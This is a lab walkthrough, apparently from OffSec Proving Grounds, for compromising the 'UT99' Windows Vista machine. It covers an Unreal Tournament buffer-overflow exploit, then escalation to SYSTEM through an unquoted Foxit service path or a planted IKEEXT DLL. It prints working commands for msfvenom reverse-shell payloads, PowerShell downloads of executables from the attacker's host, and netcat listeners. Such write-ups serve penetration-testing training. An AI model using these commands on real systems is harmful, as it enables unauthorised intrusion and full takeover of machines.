@@ -1,0 +1,503 @@
+<div id="__BVID__12___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__12___BV_modal_header_" class="modal-header"><h5 id="__BVID__12___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__12___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-main-color"><!----><div><h1>Exploitation Guide for UT99</h1>
+<h2>Summary</h2>
+<p>We'll compromise this machine by exploiting an Unreal Tournament game server, which we found by enumerating an IRC server. We then escalate via either an unquoted service path, or by exploiting a missing DLL.</p>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<p>We'll start off with a simple <code>nmap</code> scan.</p>
+<pre id="fence-code-1" class="fence-code"><code>root@kali:~# nmap -p- 192.168.120.84
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-24 07:33 EDT
+Nmap scan report for 192.168.120.84
+Host is up (0.030s latency).
+Not shown: 65186 filtered ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+80/tcp    open  http
+443/tcp   open  https
+3306/tcp  open  mysql
+6660/tcp  open  unknown
+6661/tcp  open  unknown
+
+...
+
+6999/tcp  open  iatp-normalpri
+7000/tcp  open  afs3-fileserver
+7001/tcp  open  afs3-callback
+7005/tcp  open  afs3-volser
+7007/tcp  open  afs3-bos
+64738/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 1211.68 seconds
+root@kali:~#
+</code></pre>
+<p>This reveals many open InspIRCd ports.</p>
+<h3>FTP</h3>
+<p>We are able to log in as <code>guest</code> with an empty password, but don't have write privileges.</p>
+<pre id="fence-code-2" class="fence-code"><code>root@kali:~/Documents/VulnHub/UT99# ftp 192.168.120.84
+Connected to 192.168.120.84.
+220 MadCowz FTP!
+Name (192.168.120.84:root): guest
+331 Password required for guest
+Password:
+230 Logged on
+Remote system type is UNIX.
+ftp&gt; ls
+200 Port command successful
+150 Opening data channel for directory list.
+-r-xr-xr-x 1 ftp ftp       35984520 Oct 07  2015 FoxitReader706.1126_enu_Setup.exe
+-r--r--r-- 1 ftp ftp       35922892 Oct 07  2015 KB968930.msu
+-r-xr-xr-x 1 ftp ftp      114238280 Oct 07  2015 xampp-win32-5.6.12-0-VC11-installer.exe
+226 Transfer OK
+ftp&gt; put test.txt test.txt
+local: test.txt remote: test.txt
+200 Port command successful
+550 Permission denied
+ftp&gt; bye
+221 Goodbye
+root@kali:~/Documents/VulnHub/UT99#
+</code></pre>
+<p><strong>KB968930.msu</strong> is a PowerShell script and <strong>FoxitReader706.1126_enu_Setup.exe</strong> is an installer for a version of Foxit Reader that contains a known vulnerability. This might come in handy later.</p>
+<h3>Web Application</h3>
+<p>Let's browse the default web page with <code>curl</code>.</p>
+<pre id="fence-code-3" class="fence-code"><code>root@kali:~/Documents/VulnHub/UT99# curl 192.168.120.84 -s | html2text
+****** Index of / ******
+[[ICO]] Name         Last_modified    Size Description
+===========================================================================
+[[DIR]] public_html/ 2013-11-13 14:52    -  
+===========================================================================
+     Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12 Server at
+     192.168.120.84 Port 80
+root@kali:~/Documents/VulnHub/UT99#
+</code></pre>
+<p>Navigating to the <a href="http://192.168.120.84/" target="_blank"><code>public_html</code> directory</a>, we are met with the <strong>DragonFly CMS</strong> page. The <code>read more</code> link takes us to <a href="http://192.168.120.84/public_html/index.php?name=News&amp;file=article&amp;sid=1" target="_blank">this page</a> that contains the following hint:</p>
+<pre id="fence-code-4" class="fence-code"><code>We have our first match next Friday night against Cookie Monsters, so beloved daisy has setup a practice server for user to get back into the swing of things.
+
+Join IRC and Mumble to get more information.
+
+
+Posted by Fluffy on Saturday, October 03, 2015 (11:18:32) (12 reads)
+</code></pre>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_09_image_1_uloSuMnF.PNG" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<h3>IRC</h3>
+<p>Let's install the HexChat IRC client. We can skip the <strong>don't run as root</strong> warning.</p>
+<pre id="fence-code-5" class="fence-code"><code>apt-get install hexchat -y
+</code></pre>
+<p>Next, we'll open <strong>HexChat</strong>, click <strong>Add</strong> and set the name to anything. Then, we'll click <strong>Edit</strong>, set the <strong>Server</strong> to the ip of the target machine and <strong>Port</strong> to 7000.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_09_image_5_yGSBvEQc.PNG" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<p>Next, we'll click <strong>Close</strong> and set username to anything but <code>root</code>.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_09_image_6_MYVvpJfT.PNG" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<p>Let's click <strong>Connect</strong>, open the <strong>Channel-List Window</strong> and select <em>show only channels with: 1 to 9999 users</em>. Finally, we'll click <strong>Search</strong> and observe the following:</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_09_image_7_kenjCeeB.PNG" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<pre id="fence-code-6" class="fence-code"><code>#ut99     [+nt] Fragging since UT99!  Unreal Tournament 99 Game Server UP!  IP: *THIS*  Port: 7778
+</code></pre>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_09_image_8_fBYNfBIG.PNG" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<h2>Exploitation</h2>
+<p>This version of Unreal Tournament is vulnerable to a <a href="https://www.exploit-db.com/exploits/16145" target="_blank">remote buffer overflow</a>.</p>
+<pre id="fence-code-7" class="fence-code"><code>root@kali:~# searchsploit "Unreal Tournament" | grep -v dos
+------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                           |  Path
+                                                                         | (/usr/share/exploitdb/)
+------------------------------------------------------------------------- ----------------------------------------
+Epic Games Unreal Tournament Engine 3 - UMOD Manifest.INI Arbitrary File | exploits/multiple/remote/24041.c
+Unreal Tournament - Remote Buffer Overflow (SEH)                         | exploits/windows/remote/16145.pl
+Unreal Tournament 2004 (Linux) - 'secure' Remote Overflow (Metasploit)   | exploits/linux/remote/16848.rb
+Unreal Tournament 2004 (Windows) - 'secure' Remote Overflow (Metasploit) | exploits/windows/remote/16693.rb
+Unreal Tournament 2004 - 'Secure' Remote Overflow (Metasploit)           | exploits/linux/remote/10032.rb
+Unreal Tournament 3 1.3 - Directory Traversal                            | exploits/windows/remote/6506.txt
+------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+root@kali:~# file /usr/share/exploitdb/exploits/windows/remote/16145.pl
+/usr/share/exploitdb/exploits/windows/remote/16145.pl: ASCII text, with CRLF line terminators
+root@kali:~#
+</code></pre>
+<p>Before we consider exploitation, we must keep in mind the following:</p>
+<ul>
+<li>Outbound port 4444/tcp is blocked</li>
+<li>Outbound port 443/tcp is blocked</li>
+<li>Port 7778/udp always reports as <code>open | filtered</code> from an nmap scan</li>
+</ul>
+<pre id="fence-code-8" class="fence-code"><code>root@kali:~# nmap -p 7778 -sU -A -sV 192.168.120.84
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-24 08:40 EDT
+Nmap scan report for 192.168.120.84
+Host is up (0.031s latency).
+
+PORT     STATE         SERVICE   VERSION
+7778/udp open|filtered interwise
+Too many fingerprints match this host to give specific OS details
+Network Distance: 2 hops
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT      ADDRESS
+1   32.30 ms 192.168.118.1
+2   32.42 ms 192.168.120.84
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 116.24 seconds
+root@kali:~#
+</code></pre>
+<p>To obtain a reverse shell, we'll set up a netcat listener on port 53 and then run the following to trigger the exploit:</p>
+<pre id="fence-code-9" class="fence-code"><code>root@kali:~/Documents/VulnHub/UT99# perl /usr/share/exploitdb/exploits/windows/remote/16145.pl 192.168.120.84 7778 192.168.118.3 53
+root@kali:~/Documents/VulnHub/UT99#
+</code></pre>
+<p>Our netcat session caught the shell.</p>
+<pre id="fence-code-10" class="fence-code"><code>root@kali:~# nc -lvp 53
+listening on [any] 53 ...
+192.168.120.84: inverse host lookup failed: Unknown host
+connect to [192.168.118.3] from (UNKNOWN) [192.168.120.84] 49164
+Microsoft Windows [Version 6.0.6002]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
+
+C:\UnrealTournament\System&gt;whoami
+whoami
+fluffy-pc\daisy
+
+C:\UnrealTournament\System&gt;
+</code></pre>
+<h2>Escalation</h2>
+<p>We have two privilege escalation vectors we can leverage at this point. Regardless of which we choose, we must keep the following in mind: when restarting the vulnerable service, we need to delay the power cycle for a few seconds and chain the exit command following the shutdown flags. If we run a command like <code>shutdown -r -t 0</code>, these exploits will likely crash the service with the following visual error:</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_09_image_9_sbbMKsqG.PNG" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<p>This error may occur when we are still within the first reverse shell as the reboot takes place. This visual error will stall the reboot until the error is acknowledged. To deal with this, we'll need to delay the reboot by a few seconds and also chain the exit command (e.g. <code>shutdown -r -t 10 &amp;&amp; exit</code>). This will schedule the reboot and terminate our shell properly after a second or two without crashing the service. The reboot will then succeed without issues, and we will get our privileged shell back.</p>
+<h3>Privilege Escalation Vector #1</h3>
+<p>Let's run <code>systeminfo</code>.</p>
+<pre id="fence-code-11" class="fence-code"><code>C:\UnrealTournament\System&gt;systeminfo
+systeminfo
+
+Host Name:                 FLUFFY-PC
+OS Name:                   Microsoft Windows Vista Business
+OS Version:                6.0.6002 Service Pack 2 Build 6002
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          fluffy
+Registered Organization:   
+Product ID:                89584-OEM-7332141-00029
+Original Install Date:     10/1/2015, 5:09:16 AM
+System Boot Time:          3/24/2020, 4:31:02 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 4/22/2019
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (GMT-08:00) Pacific Time (US &amp; Canada)
+Total Physical Memory:     1,023 MB
+Available Physical Memory: 578 MB
+Page File: Max Size:       2,312 MB
+Page File: Available:      1,137 MB
+Page File: In Use:         1,175 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              \\FLUFFY-PC
+Hotfix(s):                 7 Hotfix(s) Installed.
+                           [01]: KB2305420
+                           [02]: KB2999226
+                           [03]: KB935509
+                           [04]: KB937287
+                           [05]: KB938371
+                           [06]: KB955430
+                           [07]: KB968930
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     192.168.120.254
+                                 IP address(es)
+                                 [01]: 192.168.120.84
+
+C:\UnrealTournament\System&gt;
+</code></pre>
+<p>During the FTP enumeration, we spotted the FoxitReader installation. Let's determine if it's actually installed.</p>
+<pre id="fence-code-12" class="fence-code"><code>C:\UnrealTournament\System&gt;dir "C:\Program Files (x86)"
+dir "C:\Program Files (x86)"
+ Volume in drive C is HDD
+ Volume Serial Number is DC74-4FCB
+
+ Directory of C:\Program Files (x86)
+
+10/07/2015  04:04 AM    &lt;DIR&gt;          .
+10/07/2015  04:04 AM    &lt;DIR&gt;          ..
+11/02/2006  06:33 AM    &lt;DIR&gt;          Common Files
+10/07/2015  04:04 AM    &lt;DIR&gt;          Foxit Software
+10/03/2015  02:34 AM    &lt;DIR&gt;          InspIRCd
+04/11/2009  09:30 AM    &lt;DIR&gt;          Internet Explorer
+11/02/2006  08:05 AM    &lt;DIR&gt;          MSBuild
+09/30/2015  11:12 PM    &lt;DIR&gt;          Mumble
+11/02/2006  08:05 AM    &lt;DIR&gt;          Reference Assemblies
+04/11/2009  09:30 AM    &lt;DIR&gt;          Windows Calendar
+01/20/2008  08:09 PM    &lt;DIR&gt;          Windows Collaboration
+01/20/2008  08:08 PM    &lt;DIR&gt;          Windows Defender
+04/11/2009  09:30 AM    &lt;DIR&gt;          Windows Mail
+04/11/2009  09:30 AM    &lt;DIR&gt;          Windows Media Player
+11/02/2006  08:05 AM    &lt;DIR&gt;          Windows NT
+04/11/2009  09:30 AM    &lt;DIR&gt;          Windows Photo Gallery
+04/11/2009  09:30 AM    &lt;DIR&gt;          Windows Sidebar
+               0 File(s)              0 bytes
+              17 Dir(s)  13,053,112,320 bytes free
+
+C:\UnrealTournament\System&gt;
+</code></pre>
+<p>Sure enough, <strong>Foxit Software</strong> appears to be installed. It also appears to have an unquoted service path.</p>
+<pre id="fence-code-13" class="fence-code"><code>C:\UnrealTournament\System&gt;wmic service get name, displayname, pathname, startmode |findstr /i "auto"| findstr /i /v "c:\windows\\" | findstr /i /v """
+wmic service get name, displayname, pathname, startmode |findstr /i "auto"| findstr /i /v "c:\windows\\" | findstr /i /v """
+Foxit Cloud Safe Update Service                         FoxitCloudUpdateService         C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe          Auto       
+
+C:\UnrealTournament\System&gt;
+</code></pre>
+<p>In addition, we have <strong>write</strong> permissions to the directory.</p>
+<pre id="fence-code-14" class="fence-code"><code>C:\UnrealTournament\System&gt;echo test123 &gt; "C:\Program Files (x86)\Foxit Software\test.txt"
+echo test123 &gt; "C:\Program Files (x86)\Foxit Software\test.txt"
+
+C:\UnrealTournament\System&gt;type "C:\Program Files (x86)\Foxit Software\test.txt"
+type "C:\Program Files (x86)\Foxit Software\test.txt"
+test123
+
+C:\UnrealTournament\System&gt;
+</code></pre>
+<pre id="fence-code-15" class="fence-code"><code>root@kali:~/Documents/VulnHub/UT99# searchsploit "foxit reader" | grep -v dos
+------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                           |  Path
+                                                                         | (/usr/share/exploitdb/)
+------------------------------------------------------------------------- ----------------------------------------
+Foxit PDF Reader 4.1.1 - Title Stack Buffer Overflow (Metasploit)        | exploits/windows/local/16621.rb
+Foxit PDF Reader 4.2 - JavaScript File Write (Metasploit)                | exploits/windows/local/16978.rb
+Foxit PDF Reader 9.0.1.1049 - Pointer Overwrite Use-After-Free (Metasplo | exploits/windows/local/45269.rb
+Foxit Reader - '.png' Conversion Parsing tEXt Chunk Arbitrary Code Execu | exploits/windows/local/37699.py
+Foxit Reader 3.0 (Build 1301) - PDF Universal Buffer Overflow            | exploits/windows/local/8201.pl
+Foxit Reader 3.0 - Open Execute Action Stack Buffer Overflow (Metasploit | exploits/windows/local/18905.rb
+Foxit Reader 4.0 - '.pdf' Multiple Stack Based Buffer Overflow 'Jailbrea | exploits/windows/local/14727.py
+Foxit Reader 4.1.1 - Local Stack Buffer Overflow                         | exploits/windows/local/15532.py
+Foxit Reader 4.1.1 - Local Stack Overflow (Egghunter)                    | exploits/windows/local/15542.py
+Foxit Reader 7.0.6.1126 - Unquoted Service Path Privilege Escalation     | exploits/windows/local/36390.txt
+Foxit Reader 9.0.1.1049 - Buffer Overflow (ASLR &amp; DEP Bypass)            | exploits/windows/local/45163.txt
+Foxit Reader 9.0.1.1049 - Remote Code Execution                          | exploits/windows/remote/44941.txt
+Foxit Reader PDF 7.1.3.320 - Parsing Memory Corruption                   | exploits/windows/local/36859.txt
+Foxit Reader Plugin - URL Processing Buffer Overflow (Metasploit)        | exploits/windows/remote/24502.rb
+------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+root@kali:~/Documents/VulnHub/UT99# file /usr/share/exploitdb/exploits/windows/local/36390.txt
+/usr/share/exploitdb/exploits/windows/local/36390.txt: UTF-8 Unicode (with BOM) text, with CRLF line terminators
+root@kali:~/Documents/VulnHub/UT99#
+</code></pre>
+<p>Next, we'll prepare a malicious file and start a Python server.</p>
+<pre id="fence-code-16" class="fence-code"><code>root@kali:~/Documents/VulnHub/UT99# msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e generic/none LHOST=192.168.118.3 LPORT=444 &gt; pwn.exe
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of generic/none
+generic/none succeeded with size 324 (iteration=0)
+generic/none chosen with final size 324
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+root@kali:~/Documents/VulnHub/UT99#
+</code></pre>
+<pre id="fence-code-17" class="fence-code"><code>root@kali:~/Documents/VulnHub/UT99# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+</code></pre>
+<p>Let's download the malicious file onto the target machine.</p>
+<pre id="fence-code-18" class="fence-code"><code>C:\UnrealTournament\System&gt;dir "C:\Program Files (x86)\Foxit Software\"
+dir "C:\Program Files (x86)\Foxit Software\"
+ Volume in drive C is HDD
+ Volume Serial Number is DC74-4FCB
+
+ Directory of C:\Program Files (x86)\Foxit Software
+
+03/24/2020  07:29 AM    &lt;DIR&gt;          .
+03/24/2020  07:29 AM    &lt;DIR&gt;          ..
+10/07/2015  04:05 AM    &lt;DIR&gt;          Foxit Reader
+03/24/2020  07:29 AM                10 test.txt
+               1 File(s)             10 bytes
+               3 Dir(s)  13,052,928,000 bytes free
+
+C:\UnrealTournament\System&gt;powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.118.3/pwn.exe', 'C:\Program Files (x86)\Foxit Software\Foxit.exe')"
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.118.3/pwn.exe', 'C:\Program Files (x86)\Foxit Software\Foxit.exe')"
+
+
+C:\UnrealTournament\System&gt;dir "C:\Program Files (x86)\Foxit Software\"
+dir "C:\Program Files (x86)\Foxit Software\"
+ Volume in drive C is HDD
+ Volume Serial Number is DC74-4FCB
+
+ Directory of C:\Program Files (x86)\Foxit Software
+
+03/24/2020  07:39 AM    &lt;DIR&gt;          .
+03/24/2020  07:39 AM    &lt;DIR&gt;          ..
+10/07/2015  04:05 AM    &lt;DIR&gt;          Foxit Reader
+03/24/2020  07:39 AM           255,488 Foxit.exe
+03/24/2020  07:29 AM                10 test.txt
+               2 File(s)        255,498 bytes
+               3 Dir(s)  13,052,563,456 bytes free
+
+C:\UnrealTournament\System&gt;
+</code></pre>
+<pre id="fence-code-19" class="fence-code"><code>root@kali:~/Documents/VulnHub/UT99# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+192.168.120.84 - - [24/Mar/2020 10:39:14] "GET /evil.exe HTTP/1.1" 200 -
+
+C:\UnrealTournament\System&gt;
+</code></pre>
+<p>We'll need to press <strong>enter</strong> after the PowerShell command to get the command prompt back. Finally, we will set up a netcat listener and then power cycle the machine to restart the service with the malicious executable file.</p>
+<pre id="fence-code-20" class="fence-code"><code>C:\UnrealTournament\System&gt;shutdown -r -t 10 &amp;&amp; exit
+shutdown -r -t 10 &amp;&amp; exit
+root@kali:~#
+</code></pre>
+<pre id="fence-code-21" class="fence-code"><code>root@kali:~# nc -lvp 444
+listening on [any] 444 ...
+192.168.120.84: inverse host lookup failed: Unknown host
+connect to [192.168.118.3] from (UNKNOWN) [192.168.120.84] 49158
+Microsoft Windows [Version 6.0.6002]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;
+</code></pre>
+<h3>Privilege Escalation Vector #2</h3>
+<p>When we leverage this attack vector, we'll need to deal with <strong>IKE and AuthIP IPsec Keyring Modules Service (IKEEXT) - Missing DLL</strong>. First we will check if the <strong>IKEEXT</strong> service exists, is enabled, and running.</p>
+<pre id="fence-code-22" class="fence-code"><code>C:\UnrealTournament\System&gt;sc query IKEEXT
+sc query IKEEXT
+
+SERVICE_NAME: IKEEXT
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\UnrealTournament\System&gt;
+</code></pre>
+<p>Next, we need to check if the <strong>wlbsctrl.dll</strong> file exists on the system.</p>
+<pre id="fence-code-23" class="fence-code"><code>C:\UnrealTournament\System&gt;dir wlbsctrl.dll /s
+dir wlbsctrl.dll /s
+ Volume in drive C is HDD
+ Volume Serial Number is DC74-4FCB
+File Not Found
+
+C:\UnrealTournament\System&gt;
+</code></pre>
+<p>Next, we'll check the <strong>PATH</strong> variable.</p>
+<pre id="fence-code-24" class="fence-code"><code>C:\UnrealTournament\System&gt;PATH
+PATH
+PATH=C:\Python\Scripts\;C:\Python\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+
+C:\UnrealTournament\System&gt;
+</code></pre>
+<p>The *<em>C:\Python\Scripts*</em> and *<em>C:\Python*</em> directories are interesting, so let's check their permissions.</p>
+<pre id="fence-code-25" class="fence-code"><code>C:\UnrealTournament\System&gt;icacls C:\Python\Scripts\
+icacls C:\Python\Scripts\
+C:\Python\Scripts\ BUILTIN\Administrators:(I)(F)
+                   BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                   NT AUTHORITY\SYSTEM:(I)(F)
+                   NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                   BUILTIN\Users:(I)(OI)(CI)(RX)
+                   NT AUTHORITY\Authenticated Users:(I)(M)
+                   NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\UnrealTournament\System&gt;icacls C:\Python\
+icacls C:\Python\
+C:\Python\ BUILTIN\Administrators:(I)(F)
+           BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+           NT AUTHORITY\SYSTEM:(I)(F)
+           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+           BUILTIN\Users:(I)(OI)(CI)(RX)
+           NT AUTHORITY\Authenticated Users:(I)(M)
+           NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\UnrealTournament\System&gt;
+</code></pre>
+<p>Both folders have the <strong>Modify</strong> permission granted for <code>NT AUTHORITY\Authenticated Users</code> so we can use either of them to write our custom <strong>wlbsctrl.dll</strong> file.</p>
+<pre id="fence-code-26" class="fence-code"><code>root@kali:~/Documents/VulnHub/UT99# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.118.3 LPORT=4445 -f dll &gt; wlbsctrl.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 5120 bytes
+
+root@kali:~/Documents/VulnHub/UT99#
+</code></pre>
+<p>Next, we'll start a Python HTTP server and transfer the malicious file onto the target machine.</p>
+<pre id="fence-code-27" class="fence-code"><code>root@kali:~/Documents/VulnHub/UT99# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+
+</code></pre>
+<pre id="fence-code-28" class="fence-code"><code>C:\UnrealTournament\System&gt;dir /B C:\Python\wlbsctrl.dll
+dir /B C:\Python\wlbsctrl.dll
+File Not Found
+
+C:\UnrealTournament\System&gt;powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.118.3/wlbsctrl.dll', 'C:\Python \wlbsctrl.dll')"
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.118.3/wlbsctrl.dll', 'C:\Python \wlbsctrl.dll')"
+
+
+C:\UnrealTournament\System&gt;dir /B C:\Python\wlbsctrl.dll
+dir /B C:\Python\wlbsctrl.dll
+wlbsctrl.dll
+
+C:\UnrealTournament\System&gt;
+</code></pre>
+<pre id="fence-code-29" class="fence-code"><code>root@kali:~/Documents/VulnHub/UT99# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+192.168.120.84 - - [24/Mar/2020 11:18:17] "GET /wlbsctrl.dll HTTP/1.1" 200 -
+
+</code></pre>
+<p>Note that we will need to press <strong>enter</strong> after the PowerShell command to get the cmd prompt back. Finally, let's set up a netcat listener and then power cycle the machine to catch the privileged reverse shell.</p>
+<pre id="fence-code-30" class="fence-code"><code>C:\UnrealTournament\System&gt;shutdown -r -t 10 &amp;&amp; exit
+shutdown -r -t 10 &amp;&amp; exit
+root@kali:~#
+</code></pre>
+<pre id="fence-code-31" class="fence-code"><code>root@kali:~# nc -lvp 4445
+listening on [any] 4445 ...
+192.168.120.84: inverse host lookup failed: Unknown host
+connect to [192.168.118.3] from (UNKNOWN) [192.168.120.84] 49158
+Microsoft Windows [Version 6.0.6002]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;
+</code></pre>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
